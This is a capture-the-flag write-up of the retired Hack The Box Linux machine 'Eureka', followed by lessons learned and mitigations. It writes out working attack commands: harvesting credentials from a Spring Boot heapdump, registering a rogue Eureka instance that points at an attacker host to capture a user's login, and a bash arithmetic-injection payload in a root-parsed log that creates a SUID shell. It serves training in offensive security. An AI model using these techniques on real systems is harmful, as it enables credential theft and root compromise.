---
machine: Eureka
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, spring-boot, actuator, heapdump, eureka, spring-cloud-gateway, mitm, arithmetic-injection, privesc]
---

# Eureka — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`furni.htb` is Spring Boot and exposes `/actuator/heapdump`. The memory dump contains `oscar190` credentials, which give SSH access. The microservice configuration files reveal the gateway on `8080`, the user service on `8081`, the website on `8082` and Eureka on `8761`. With the Eureka credentials, a fake `USER-MANAGEMENT-SERVICE` instance pointing at an attacker server is registered; the gateway load-balances requests to it and captures `miranda-wise`'s login, including her password. As `miranda-wise`, a line is written to the log consumed by `/opt/log_analyse.sh`, run by root: bash arithmetic comparison evaluates the injected expression and creates a SUID bash.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,8761 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `80`: nginx with Spring Boot.
- `8761`: Eureka dashboard.

```bash
echo '<IP> furni.htb' | sudo tee -a /etc/hosts
feroxbuster -u http://furni.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

## Enumeration

`/actuator` is exposed and `/actuator/heapdump` downloads an ~80 MB dump. Analyse it with VisualVM or `jdumpspider`; service credentials appear among the strings:

```bash
curl -o heapdump http://furni.htb/actuator/heapdump
# open the dump in VisualVM and search for credentials
```

The dump contains `oscar190`'s password, which works over SSH. The home directory and `/opt` show the application layout; nginx reveals the backends:

```text
8080  spring-cloud-gateway (internal)
8081  user-management-service
8082  furni
8761  Eureka
```

The `application.yaml` files under `/var/www/web` hold the Eureka credentials and the gateway routes (`lb://USER-MANAGEMENT-SERVICE`).

## Foothold

With `oscar190` over SSH, the configuration files confirm that the gateway resolves the user service by name in Eureka. Eureka allows instance registration through its API:

```bash
curl -u 'EurekaSrvr:<PASSWORD>' -X POST \
  -H 'Content-Type: application/json' \
  http://127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -d '{"instance":{"hostName":"<LHOST>","app":"USER-MANAGEMENT-SERVICE","port":{"$":8081,"@enabled":"true"},"status":"UP"}}'
```

A server on `8081` answers `/login`. When `miranda-wise` logs in every few minutes, the gateway sends the request to the fake service and the form with her password is captured.

## Lateral movement

The captured password works over SSH for `miranda-wise`, who can read `user.txt` and inspect the application scripts.

```bash
ssh miranda-wise@furni.htb
```

## Privilege escalation

`/opt/log_analyse.sh` is readable and runs from a root cron. The script compares the HTTP status with `-eq`, which makes bash evaluate both sides as arithmetic expressions:

```bash
[[ "$status" -eq 200 ]]
```

`miranda-wise` can write the log it parses:

```bash
echo 'HTTP Status: x[$(cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash)]' \
  > /var/www/web/user-management-service/log/application.log
```

On the next run, `x[$(...)]` is evaluated as an array index and runs the command as root:

```bash
/tmp/rootbash -p
```

## Evidence

- Downloadable `/actuator/heapdump` and `oscar190` credentials in memory.
- Configuration with Eureka, the gateway and internal services.
- Registered fake instance and captured `miranda-wise` login.
- SSH as `miranda-wise` and write access to the log.
- `log_analyse.sh` with `-eq` and a SUID bash created by the root cron.

## Lessons learned

- A heapdump exposes plaintext secrets even when the application does not show them.
- Eureka without strong authentication allows service discovery poisoning.
- The gateway trusts registration and load-balances to an arbitrary instance.
- `[[ "$x" -eq ... ]]` evaluates arithmetic and can run commands.
- A writable log consumed by root is a direct privilege escalation path.

## Mitigations and detection

- Disable or authenticate `/actuator` and never expose `heapdump`.
- Rotate credentials and keep them in memory no longer than necessary.
- Authenticate and authorize Eureka registration; validate host and IP.
- Use string comparisons (`=`) and sanitize values before `-eq`.
- Restrict log writes and run analysers as an unprivileged user.
- Alert on new instance registrations and on processes creating SUID files.

## References

- [0xdf — Eureka](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [Hack The Box — Eureka](https://app.hackthebox.com/machines/eureka)
